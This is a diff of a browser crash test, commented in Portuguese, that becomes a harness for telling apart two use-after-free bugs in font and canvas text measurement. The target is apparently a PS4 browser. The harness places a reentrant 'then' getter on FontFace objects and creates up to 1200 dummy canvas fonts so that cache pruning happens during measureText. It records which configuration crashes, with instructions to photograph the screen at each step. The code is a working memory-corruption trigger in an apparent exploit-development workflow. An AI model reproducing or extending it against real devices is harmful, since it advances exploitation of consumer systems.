@@ -1,65 +1,185 @@
 <!DOCTYPE html>
-<p>This test passes if it does not crash.</p>
-<div id="status">Running test...</div>
+<pre id="log"></pre>
 <script>
+// DESAMBIGUACAO: FontMetrics UAF (5ccd64b) vs UAF #2 GlyphGeometryCache (42b1e2a)
+//
+// Hipotese:
+//   Se B1 crasha SEM dummies → UAF #2 (ja reportado, mesma mecanica do 42b1e2a)
+//   Se B1 crasha SOMENTE COM dummies → FontMetrics UAF (5ccd64b, bug NOVO)
+//
+// Logica:
+//   UAF #2 (GlyphGeometryCache) nao precisa de dummies — ja confirmado com 0
+//   FontMetrics UAF precisa de pruneUnreferencedEntries durante width() → dummies
+//
+// INSTRUCAO: tirar foto assim que [EXECUTANDO] aparecer para cada teste.
+// O numero do ultimo teste visivel no estado EXECUTANDO = mecanismo confirmado.
 
+var out = document.getElementById('log');
+var buf = '';
+function log(s) { buf += s + '\n'; out.textContent = buf; }
 
-  function finish(msg) {
-      document.getElementById('status').innerText = msg;
-    
-  }
+var uid = 0;
+var dummyId = 0;
+var alive = [];
 
-  // Carrega o binário local de forma síncrona para garantir o comportamento de reentrância
-  const xhr = new XMLHttpRequest();
-  xhr.open('GET', 'resources/Ahem.woff', false);
-  xhr.overrideMimeType('text/plain; charset=x-user-defined');
+function addDummies(n) {
+    for (var i = 0; i < n; i++) {
+        var d = document.createElement('canvas');
+        d.width = 1; d.height = 1;
+        d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
+        alive.push(d);
+    }
+}
 
-  try {
-      xhr.send();
-      if (xhr.status === 200 || xhr.status === 0) {
-          const text = xhr.responseText;
-          const bytes = new Uint8Array(text.length);
-          for (let i = 0; i < text.length; i++) {
-              bytes[i] = text.charCodeAt(i) & 0xff;
-          }
-          const blob = new Blob([bytes], { type: 'font/woff' });
-          const dataUrl = URL.createObjectURL(blob);
+function makeCtx(font) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    c.style.cssText = 'position:absolute;left:-9999px';
+    document.body.appendChild(c);
+    var ctx = c.getContext('2d');
+    ctx.font = font;
+    alive.push(c);
+    return ctx;
+}
 
-          // Usa o Blob URL em vez de local(Helvetica)
-          let face = new FontFace('MyTestFam', 'url("' + dataUrl + '")');
-          face.loaded;
-          document.fonts.add(face);
+fetch('Ahem.woff')
+    .then(function(r) { return r.arrayBuffer(); })
+    .then(function(b) {
+        return new Promise(function(res, rej) {
+            var fr = new FileReader();
+            fr.onload  = function(e) { res(e.target.result); };
+            fr.onerror = rej;
+            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
+        });
+    })
+    .then(function(dataUrl) {
 
-          let context = document.createElement('canvas').getContext('2d');
+    var tests = [
 
-          context.save();
-          context.lineWidth = 0.5;
+    // ------------------------------------------------------------------
+    // Teste 1 — Times + Ahem(fallback) + Cherokee + 0 dummies
+    //
+    // Se CRASHAR: UAF #2 (GlyphGeometryCache) — mesmo mecanismo do 42b1e2a
+    //             dummies NAO sao necessarios → crash ja era do bug reportado
+    //
+    // Se PASSAR: getter nao dispara sem dummies (como A1 confirmou)
+    //            → dummies sao essenciais para o crash → segue para Teste 2
+    // ------------------------------------------------------------------
+    {
+        id: 1,
+        name: 'Times + Ahem(fallback) + Cherokee + 0 dummies',
+        result: 'Se crashar: UAF #2 (ja reportado). Se passar: dummies sao essenciais.',
+        dummies: 0
+    },
 
-          context.font = '10px MyTestFam';
+    // ------------------------------------------------------------------
+    // Teste 2 — Times + Ahem(fallback) + Cherokee + 500 dummies
+    //
+    // Se CRASHAR: FontMetrics UAF dispara com < 1000 dummies no PS4
+    //             (threshold de pruneUnreferencedEntries pode ser menor)
+    //
+    // Se PASSAR: precisa de mais dummies → segue para Teste 3
+    // ------------------------------------------------------------------
+    {
+        id: 2,
+        name: 'Times + Ahem(fallback) + Cherokee + 500 dummies',
+        result: 'Se crashar: pruneUnreferencedEntries dispara com < 1000 entradas no PS4.',
+        dummies: 500
+    },
 
-          let reentered = false;
-          Object.defineProperty(FontFace.prototype, 'then', {
-            configurable: true,
-            get() {
-              if (reentered)
-                return undefined;
-              reentered = true;
-              for (let i = 0; i < 18; i++) {
-                context.save();
-                context.lineWidth = 1 + i;
-              }
-              reentered = false;
-              return undefined;
-            }
-          });
+    // ------------------------------------------------------------------
+    // Teste 3 — Times + Ahem(fallback) + Cherokee + 1200 dummies
+    //
+    // ESTE DEVE CRASHAR (confirmado em B1).
+    // Anchor de confirmacao: se passou tudo acima e este crasha,
+    // confirma que 1200 dummies e o minimo necessario para o FontMetrics UAF.
+    // ------------------------------------------------------------------
+    {
+        id: 3,
+        name: 'Times + Ahem(fallback) + Cherokee + 1200 dummies [CRASH ESPERADO]',
+        result: 'Confirmacao: B1 crashou com esta configuracao.',
+        dummies: 1200
+    },
 
-          context.measureText('a');
-          finish("PASS if no crash");
-      } else {
-          finish("FAIL: Ahem.woff not found");
-      }
-  } catch (e) {
-      finish("FAIL: " + e.message);
-  }
+    // ------------------------------------------------------------------
+    // Teste 4 — Ancora: 2 faces MESMA familia + 0 dummies [CRASH ESPERADO]
+    // Padrao 42b1e2a original. Confirma que sessao ainda funciona.
+    // ------------------------------------------------------------------
+    {
+        id: 4,
+        name: '2 faces MESMA familia + 0 dummies [CRASH ESPERADO — ancora]',
+        result: 'Padrao 42b1e2a original. Deve crashar como referencia.',
+        dummies: 0,
+        isAnchor: true
+    }
+
+    ];
+
+    var idx = 0;
+    function next() {
+        if (idx >= tests.length) {
+            log('\n=== TODOS PASSARAM SEM CRASH ===');
+            return;
+        }
+        var t = tests[idx++];
+        log('--- Teste ' + t.id + ': ' + t.name);
+        log('    ' + t.result);
+
+        setTimeout(function() {
+            addDummies(t.dummies);
+            log('    [EXECUTANDO measureText...] <<< FOTO AQUI SE TRAVAR');
+            setTimeout(function() {
+
+                var id = uid++;
+
+                if (t.isAnchor) {
+                    // Padrao 42b1e2a: 2 faces mesma familia
+                    var f1 = new FontFace('CF' + id, 'url("' + dataUrl + '")');
+                    var f2 = new FontFace('CF' + id, 'url("' + dataUrl + '")');
+                    document.fonts.add(f1);
+                    document.fonts.add(f2);
+                    void f1.loaded; void f2.loaded;
+                    alive.push(f1, f2);
+                    var trap = function() {
+                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+                    };
+                    Object.defineProperty(f1, 'then', { get: trap });
+                    Object.defineProperty(f2, 'then', { get: trap });
+                    var ctx = makeCtx('10px Times, CF' + id);
+                    ctx.measureText('\u13A0\u13A2\u13A4');
+
+                } else {
+                    // Padrao B1: Times(primary) + Ahem(fallback) + Cherokee
+                    var face = new FontFace('BF' + id, 'url("' + dataUrl + '")');
+                    document.fonts.add(face);
+                    void face.loaded;
+                    alive.push(face);
+                    var reen = false;
+                    Object.defineProperty(face, 'then', {
+                        configurable: true,
+                        get: function() {
+                            if (reen) return undefined;
+                            reen = true;
+                            document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+                            reen = false;
+                            return undefined;
+                        }
+                    });
+                    var ctx = makeCtx('10px Times, BF' + id);
+                    ctx.measureText('\u13A0\u13A2\u13A4');
+                }
+
+                log('    PASSOU\n');
+                next();
+            }, 200);
+        }, 150);
+    }
+
+    log('=== DESAMBIGUACAO: FontMetrics UAF vs UAF #2 ===');
+    log('Ahem.woff OK. Tirar foto ao ver [EXECUTANDO] antes de cada crash.\n');
+    next();
+
+}).catch(function(e) {
+    document.getElementById('log').textContent = 'ERRO: ' + e.message;
+});
 </script>
-
